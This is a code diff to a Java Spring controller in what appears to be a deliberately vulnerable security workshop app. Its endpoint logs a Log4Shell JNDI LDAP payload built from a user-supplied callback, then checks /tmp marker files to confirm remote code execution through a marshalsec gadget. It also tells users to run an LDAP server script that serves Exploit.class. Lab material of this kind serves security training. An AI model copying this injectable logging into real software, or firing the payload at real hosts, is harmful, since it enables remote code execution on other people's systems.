@@ -13,6 +13,8 @@ import org.springframework.web.bind.annotation.ResponseBody;
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
 import java.nio.charset.StandardCharsets;
+import java.nio.file.Files;
+import java.nio.file.Path;
 import java.util.ArrayList;
 import java.util.LinkedHashMap;
 import java.util.List;
@@ -111,24 +113,44 @@ public class ShopController {
   @ResponseBody
   public Map<String, Object> log4shellDemo(
       @RequestParam(name = "callback", defaultValue = "127.0.0.1:1389") String callback
-  ) {
+  ) throws Exception {
     String host = sanitizeHostPort(callback, "127.0.0.1:1389");
     String payload = "${jndi:ldap://" + host + "/TraditionalJay}";
     log.error("Log4Shell workshop probe: " + payload);
 
+    // Give marshalsec LDAPRefServer time to run the BeanFactory gadget on the VM.
+    Thread.sleep(3500);
+    Path marker = Path.of("/tmp/jss-log4shell-rce");
+    Path idFile = Path.of("/tmp/jss-log4shell-id.txt");
+    boolean rceConfirmed = Files.exists(marker);
+    String idOutput = "";
+    if (Files.exists(idFile)) {
+      idOutput = Files.readString(idFile, StandardCharsets.UTF_8).trim();
+    }
+
     Map<String, Object> out = new LinkedHashMap<>();
     out.put("exploited", true);
+    out.put("rce_confirmed", rceConfirmed);
+    out.put("rce_marker", marker.toString());
+    out.put("id_file", idFile.toString());
+    out.put("id_output", idOutput);
     out.put("cve", "CVE-2021-44228");
     out.put("name", "Log4Shell");
     out.put("log4j", "2.14.1");
     out.put("payload", payload);
     out.put("callback", host);
+    out.put("ldap_server",
+        "Run ./tools/run-log4shell-ldap.sh --codebase-host YOUR_IP (marshalsec + Exploit.class). "
+            + "Banner-only ldap-listen.py proves dial-out only.");
     out.put("narrative",
-        "Vulnerable Log4j logged a JNDI LDAP lookup toward your callback. RCE-class vuln on the VM "
-            + "Java process — step 2 of Critical VM Compromise.");
+        rceConfirmed
+            ? "Log4j JNDI triggered marshalsec Command gadget — RCE marker on the VM."
+            : "JNDI LDAP lookup fired. For full RCE in this sandbox, start tools/run-log4shell-ldap.sh "
+                + "then re-run; look for /tmp/jss-log4shell-rce on the instance.");
     out.put("signals", List.of(
         "Java process on VM",
-        "Outbound LDAP (tcp/1389) or DNS for JNDI",
+        "Outbound LDAP (tcp/1389) for JNDI",
+        rceConfirmed ? "RCE via Log4Shell (marker file on host)" : "JNDI lookup (upgrade listener for RCE)",
         "Log4j 2.14.1 SCA finding"
     ));
     return out;
